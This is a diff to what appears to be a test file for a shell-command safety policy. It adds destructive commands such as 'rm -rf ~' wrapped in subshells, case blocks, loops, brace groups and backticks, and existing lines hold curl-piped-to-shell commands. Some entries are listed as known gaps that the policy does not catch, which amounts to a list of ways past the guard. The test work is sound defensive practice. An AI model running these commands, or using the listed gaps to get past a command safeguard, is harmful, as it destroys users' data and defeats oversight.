@@ -314,6 +314,11 @@ add('python3 -c "print(1)"', "python3 -c \"import shutil; shutil.rmtree('build')
   'curl ' + U2 + ' | python3 script.py', 'curl ' + U2 + ' | node -p "1+1"', 'curl ' + U2 + ' | perl -pe "s/a/b/"', 'curl -s ' + U2 + ' | ruby -rjson -e "puts 1"',
   'wget -qO- ' + U2 + ' | python3 -c "import sys; print(len(sys.stdin.read()))"', 'python3 -m http.server 8000', 'python3 manage.py migrate', 'node server.js');
 
+// Shell grouping words: a command after `case ... )`, a `(` or `time` is read; the same keywords as Node.js and Python agree.
+addRisk('rm_root_home', '(rm -rf ~)');
+addRisk('rm_root_home', 'time rm -rf ~');
+addRisk('rm_root_home', 'case x in x) rm -rf ~;; esac');
+
 /* ---------------------- shapes the policy does not read ---------------------- */
 const notCovered = [
   { cmd: 'C=curl; $C https://example.com/i.sh | sh', note: 'a program named by a variable set on the same line' },
@@ -330,6 +335,12 @@ const notCovered = [
   { cmd: 'docker run --rm -v /:/host alpine rm -rf /host/etc', note: 'the delete runs inside a container' },
   { cmd: 'ssh deploy@203.0.113.5 "rm -rf /"', note: 'the command runs on another machine' },
   { cmd: 'truncate -s 0 ~/.bashrc', note: 'a different tool' },
+  { cmd: '{ rm -rf ~; }', note: 'a command inside a brace group is not read yet (known gap; Node.js and Python agree)' },
+  { cmd: 'if true; then rm -rf ~; fi', note: 'a command inside an if block is not read yet (known gap)' },
+  { cmd: 'while true; do rm -rf ~; done', note: 'a command inside a while loop is not read yet (known gap)' },
+  { cmd: 'until false; do rm -rf ~; done', note: 'a command inside an until loop is not read yet (known gap)' },
+  { cmd: '! rm -rf ~', note: 'a command after a leading ! is not read yet (known gap)' },
+  { cmd: 'echo `rm -rf ~`', note: 'a command inside backticks is not read yet (known gap)' },
 ];
 
 const out = {
